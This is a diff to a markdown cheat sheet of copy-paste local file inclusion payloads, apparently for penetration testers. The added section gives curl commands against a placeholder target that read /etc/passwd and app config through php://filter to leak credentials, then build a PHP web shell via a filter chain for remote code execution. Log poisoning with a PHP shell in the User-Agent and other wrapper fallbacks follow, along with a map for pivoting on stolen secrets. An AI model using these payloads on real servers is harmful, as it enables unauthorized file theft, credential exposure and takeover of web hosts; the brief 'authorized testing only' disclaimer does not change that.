@@ -1,7 +1,38 @@
 # LFI Arsenal — Traversal, Encodings, Wrappers & LFI→RCE Payloads (copy-paste)
 
+**Author:** x8bitranjit
+
 > Companion to `LFI_TESTING_GUIDE.md`. Authorized testing only — benign markers, clean up artifacts (Guide §21).
 > Win condition is never `/etc/passwd` — it's **secrets/source disclosure** or **RCE/shell** (Guide §10–§16).
+
+---
+
+## 0. The whole attack in one sequence (read → classify → filter-chain RCE, worked end-to-end in Guide §12.1)
+*Confirm traversal → the base64 round-trip that decides include-vs-read (the ceiling) → source disclosure → filter-chain RCE with no write. The classification in step 2 is the whole game.*
+
+```bash
+T='https://target.example/?page='
+
+# 1. CONFIRM traversal (Medium proof only) — base64 wrapper also beats a forced .php suffix
+curl -s "${T}php://filter/convert.base64-encode/resource=../../../../etc/passwd" | base64 -d | head
+
+# 2. CLASSIFY — the decisive test: did a base64 BLOB come back (=include, evaluates wrappers => RCE ceiling)
+#    or the RAW php://filter string (=file_get_contents-class read => disclosure only, hand to PathTraversal)?
+#    (blob = include sink → continue to RCE)
+
+# 3. SOURCE-DISCLOSE the app (High on its own — leaks DB/cloud creds)
+curl -s "${T}php://filter/convert.base64-encode/resource=../config" | base64 -d
+
+# 4. FILTER-CHAIN RCE — synthesize <?php system($_GET['c']);?> from the ONE param, no write/log/upload
+python3 poc/filter_chain_rce.py --cmd id            # drives synacktiv php_filter_chain_generator -> prints the chain
+curl -s "${T}<URL-ENCODED-14KB-CHAIN>&c=id"          # chain in the QUERY (not a header: Apache caps headers ~8KB)
+#   -> uid=33(www-data) = RCE. One benign command, then STOP.
+
+# FALLBACKS if php://filter is WAF-blocked (Guide §11/§13/§15):
+#   log poisoning:  UA: <?php system($_GET['c']);?>  -> include .../access.log&c=id
+#   session.upload_progress race ; pearcmd.php config-create ; data:// (needs allow_url_include=On)
+```
+**Cash-out map:** include sink → **filter-chain / log / session / wrapper RCE (Critical, §11-15)** · read-only sink → **source/secret disclosure + error-oracle file leak (High, §10)** · `/etc/passwd`/`win.ini` only → **traversal proof (Medium)** · `.env`/cloud-creds/`/proc/self/environ` → **secret disclosure → pivot (High→Critical)**.
 
 ---
 
